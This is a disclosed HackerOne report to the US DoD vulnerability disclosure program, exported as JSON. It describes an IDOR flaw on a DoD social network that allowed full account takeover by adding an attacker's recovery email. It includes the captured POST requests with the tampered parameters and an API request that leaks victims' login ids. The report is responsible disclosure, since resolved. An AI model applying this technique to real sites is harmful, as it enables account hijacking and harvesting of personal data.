{"id":847452,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NDc0NTI=","url":"https://hackerone.com/reports/847452","title":"Full Account Take-Over of ████████ Members via IDOR","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-04-11T16:43:50.478Z","submitted_at":"2020-04-11T16:43:50.478Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"r00tpgp","url":"/r00tpgp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/214/907/bbff1d78663047d6dfa3d2ef20d46ccccc96ae0c_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-05-14T18:08:23.515Z","bug_reporter_agreed_on_going_public_at":"2020-04-22T00:23:20.206Z","team_member_agreed_on_going_public_at":"2020-05-14T18:08:23.432Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"##Summary\nhttps://███████ is a Social Network Site belonging to US DoD. Membership is open to anyone, I have found a method to fully take-over any members' account by exploiting an IDOR bug in the `██████████` end-point. By changing the following values in the `POST` request to the affected end-point:\n\n`userName`\n`originalEmail`\n`Email`\n`RecoveryEmail`\n\nI am able to add Recovery Email address of my choice, thus, enabling me to send a password reset link to my attacker controlled email address. I have uploaded a video PoC to demo my finding. Note that the following test accounts were used:\n\n###Attacker\nlogin: ████████\n\n###Victim\nlogin: ███████\n\nI added `████` email into the victim account. Note that this only works on victims that have no recovery email address defined or recovery email that are not yet verified. This technique will NOT work on victims' that already have a confirmed recovery email address.\n\nAlso note, that I am using multi-containers plugin for Firefox, therefore, each tab represents separate browser session. Finally, note that in my PoC video, I had to insert the victim recovery email link `████████/self?guid=█████████` into the attackers' session because a valid session is required to validate the email. The session does not necessary have to belong to the victims' session to validate.\n\nThe IDOR bug can be obtained by intercepting the 2-FA Authentication switch:\n\n███\n\n\n## Vulnerable End-Point\n\nHere is the vulnerable POST request when captured, the cookies and `__RequestVerificationToken` must be valid for this attack to work, I have ==highlighted== the vulnerable IDOR parameters:\n\nPOST /self HTTP/1.1\nHost: █████████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://███/self\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 739\nConnection: close\nCookie: ███████-Http-Session=███; _ga=█████; _gid=███; AWSALB=█████; AWSALBCORS=████; ASP.NET_SessionId=██████████; BIGipServer~Sync_Only~passport_pool=█████; akaalb_albcustom=█████████████def~id=██████████; AWSALB=███; AWSALBCORS=██████; googtrans=/en/en; googtrans=/en/en; UserName=███████████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-███; _gat_███Tracker=1; __RequestVerificationToken_Lw__=█████\nUpgrade-Insecure-Requests: 1\n\n__RequestVerificationToken=█████████\u0026==userName=████\u0026originalEmail=████████%40gmail.com\u0026oldPassword=\u0026EmailSent=False\u0026RecoveryEmailSent=true\u0026RecoveryEmailVerified=true\u0026SecurityImagePath=\u0026Translate=en\u0026COIGroupID=\u0026Username=█████████\u0026Email=██████████%40gmail.com\u0026ConfirmEmail=\u0026RecoveryEmail=██████████\u0026ConfirmRecoveryEmail=\u0026NewPassword=\u0026ConfirmPassword=\u0026TwoFactorAuthenticationEnabled=false\u0026Password=\u0026Password=\u0026Password=\u0026Password=\u0026Password===\n\n## Impact\n\nAn attacker can add his email address into the recovery field of any █████████ member that has not yet defined or verified a Recovery Email address. He will then be able to force a password reset link to be sent to his email address and change the victims' password and login into victims' account. Attacker now has full control of victims' account.\n\nAlso, victim login id is easily retrievable from this end point. By running the `RequesteeId` using any valid user session, attacker is  able to retrieve the `ProfileUrl` containing the victims' login id.\n\n##Request\n\nPOST /api.ashx/v2/users/████/friends.json HTTP/1.1\nHost: █████████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0\nAccept: application/json, text/javascript, /; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nAuthorization-Code: █████████\nRest-Authorization-Code: █████████\nX-Requested-With: XMLHttpRequest\nContent-Length: 35\nOrigin: https://████\nConnection: close\nReferer: https://████/members/███/\nCookie: _ga=███████; _gid=██████████; AWSALB=█████████; AWSALBCORS=█████; █████████-Http-Session=█████████; googtrans=/en/en; UserName=█████████,█████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-████; akaalb_albcommunity=██████████; AuthorizationCookie=███; BIGipServer~Sync_Only~community_pool=██████████\n\n==RequesteeId=███████==\u0026RequestMessage=+\n\n##Reply:\n\n\n{\n\"Friendship\": {\n\"CreatedDate\": \"2020-04-11T08:22:53.247\",\n\"FriendshipState\": \"Pending\",\n\"LastModifiedDate\": \"2020-04-11T08:22:53.247\",\n\"RequestMessage\": \" \",\n\"RequestorId\": ██████,\n==\"RequesteeId\": █████,==\n\"User\": {\n\"AvatarUrl\": \"https://████████/cfs-file/__key/system/images/anonymous.gif\",\n\"DisplayName\": \"█████\",\n==\"ProfileUrl\": \"https://████/members/███████\",==\n\"Username\": \"██████████\",\n\"CurrentStatus\": null,\n\"Id\": █████████\n},\n\"Id\": ███\n},\n\"Info\": [],\n\"Warnings\": [],\n\"Errors\": []\n}\n\n\nTherefore, attacker just needs to feed the login id into the vulnerable end-point and follow the steps outlined in the PoC video to take over thousands of ██████████ user accounts!","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":6,"voters":["daehee","zerodaywolf","rrivera","sl33pyp0t4t0","tajy","r00talpha"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7630099,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2020-04-11T16:43:51.329Z","updated_at":"2020-04-11T16:43:51.329Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7630133,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Video embedded for easy viewing:\n\n███","automated_response":false,"created_at":"2020-04-11T16:49:53.562Z","updated_at":"2020-05-14T17:19:06.108Z","actor":{"username":"r00tpgp","cleared":false,"url":"/r00tpgp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/907/bbff1d78663047d6dfa3d2ef20d46ccccc96ae0c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7630153,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-04-11T16:55:41.474Z","updated_at":"2020-05-14T17:36:16.071Z","additional_data":{"old_title":"Account Take-Over of Members via IDOR","new_title":"Full Account Take-Over of ████ Members via IDOR"},"actor":{"username":"r00tpgp","cleared":false,"url":"/r00tpgp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/907/bbff1d78663047d6dfa3d2ef20d46ccccc96ae0c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7632587,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, I would also like you to also consider #847185 as as valid bug. One of the end-point mentioned in that report was used  to  identify the victims login id  used to exploit the account takeover bug. I self closed it earlier was because I wasn't sure if it was a vulnerability but now that I had discovered this bug I feel it is a bug in its own right and can be used to harvest personal information for further damage.  Cheers.","automated_response":false,"created_at":"2020-04-12T05:40:17.581Z","updated_at":"2020-04-12T05:40:17.581Z","actor":{"username":"r00tpgp","cleared":false,"url":"/r00tpgp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/907/bbff1d78663047d6dfa3d2ef20d46ccccc96ae0c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7643695,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2020-04-13T13:44:27.670Z","updated_at":"2020-04-13T13:44:27.670Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7643713,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-04-13T13:46:58.700Z","updated_at":"2020-04-13T13:46:58.700Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":690536},"actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7644121,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@agent-l8 Thanks for the quick response. I'm glad to be able to assist, have a great day ahead of you!","automated_response":false,"created_at":"2020-04-13T14:22:10.418Z","updated_at":"2020-04-13T14:22:10.418Z","actor":{"username":"r00tpgp","cleared":false,"url":"/r00tpgp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/907/bbff1d78663047d6dfa3d2ef20d46ccccc96ae0c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7644168,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @r00tpgp we will let you know if we need anything further and update you as we are able. Appreciate it!","automated_response":false,"created_at":"2020-04-13T14:28:59.297Z","updated_at":"2020-04-13T14:28:59.297Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7742224,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2020-04-21T15:51:07.656Z","updated_at":"2020-04-21T15:51:07.656Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"r00tpgp","url":"/r00tpgp"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7746347,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @agent-l8, that was fast! Great job! Can I disclose this to the community? They might be able to help find similar bugs for your esteem org. Cheers!","automated_response":false,"created_at":"2020-04-22T00:23:20.230Z","updated_at":"2020-04-22T00:23:20.230Z","first_to_agree":true,"actor":{"username":"r00tpgp","cleared":false,"url":"/r00tpgp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/907/bbff1d78663047d6dfa3d2ef20d46ccccc96ae0c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7752916,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@r00tpgp we do minor redaction's and disclose high/crit reports but are in the process of changing a few things in how it is done. That said- you can request disclosure and it will be added to the queue to be pushed out once we are able.","automated_response":false,"created_at":"2020-04-22T10:50:33.227Z","updated_at":"2020-04-22T10:50:33.227Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8003099,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for participating in the DoD Vulnerability Disclosure Program. We're publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at VDP-Questions@dc3.mil if there are any questions, concerns or issues.","automated_response":false,"created_at":"2020-05-14T18:08:23.446Z","updated_at":"2020-05-14T18:08:23.446Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8003100,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-05-14T18:08:23.540Z","updated_at":"2020-05-14T18:08:23.540Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8003101,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","automated_response":false,"created_at":"2020-05-14T18:08:28.984Z","updated_at":"2020-05-14T18:08:28.984Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}